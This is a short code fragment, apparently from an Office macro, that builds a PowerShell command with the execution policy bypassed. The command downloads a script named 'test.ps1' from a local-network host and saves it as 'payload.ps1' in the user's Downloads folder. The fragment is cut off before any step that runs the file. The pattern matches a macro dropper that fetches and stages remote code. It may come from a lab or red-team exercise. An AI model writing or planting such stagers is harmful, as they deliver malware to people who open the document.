...
psCommand = "powershell.exe -ExecutionPolicy Bypass -Command " & _
    """$dl = $env:USERPROFILE + '\Downloads'; " & _
    "Invoke-WebRequest -Uri 'http://192.168.0.115:8000/test.ps1' -OutFile ($dl + '\payload.ps1'); " & _
